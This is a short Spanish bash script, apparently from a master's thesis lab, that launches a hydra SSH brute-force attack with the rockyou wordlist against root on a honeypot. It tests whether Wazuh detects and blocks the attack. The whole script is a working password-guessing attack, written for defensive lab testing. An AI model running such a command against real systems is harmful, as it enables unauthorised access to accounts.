#!/bin/bash
# =============================================================
# TFM — Script de simulación de ataque Red Team
# Ejecutar en TFM-Kali (10.0.2.15)
# MITRE ATT&CK T1110.001 — Brute Force: Password Guessing
# ⚠️  Solo para uso en entornos de laboratorio controlados
# =============================================================

HONEYPOT_IP="10.0.2.3"
WORDLIST="/usr/share/wordlists/rockyou.txt"
TARGET_USER="root"
THREADS=16

echo ""
echo "=========================================="
echo "   TFM — Simulación Ataque Red Team"
echo "   MITRE T1110.001 - Password Guessing"
echo "=========================================="
echo ""
echo "🎯 Objetivo: $HONEYPOT_IP"
echo "👤 Usuario:  $TARGET_USER"
echo "📚 Wordlist: $WORDLIST"
echo ""

# Descomprimir rockyou si hace falta
if [ ! -f "$WORDLIST" ] && [ -f "${WORDLIST}.gz" ]; then
    echo "📦 Descomprimiendo rockyou.txt..."
    sudo gunzip "${WORDLIST}.gz"
fi

if [ ! -f "$WORDLIST" ]; then
    echo "❌ Wordlist no encontrada: $WORDLIST"
    exit 1
fi

# Verificar que hydra está instalado
if ! command -v hydra &>/dev/null; then
    echo "❌ Hydra no está instalado. Instalar con: sudo apt install hydra"
    exit 1
fi

echo "🚀 Lanzando ataque de fuerza bruta..."
echo "   (Wazuh debería detectarlo y bloquearnos en < 30 segundos)"
echo ""

hydra -l "$TARGET_USER" \
      -P "$WORDLIST" \
      -t "$THREADS" \
      -V \
      -I \
      "ssh://$HONEYPOT_IP"

echo ""
echo "=========================================="
echo "Ataque finalizado o bloqueado."
echo "Verificar en el Manager:"
echo "  sudo cat /var/ossec/logs/active-responses.log"
echo "Verificar en el Honeypot:"
echo "  sudo iptables -L INPUT -n | grep $HONEYPOT_IP"
echo "=========================================="
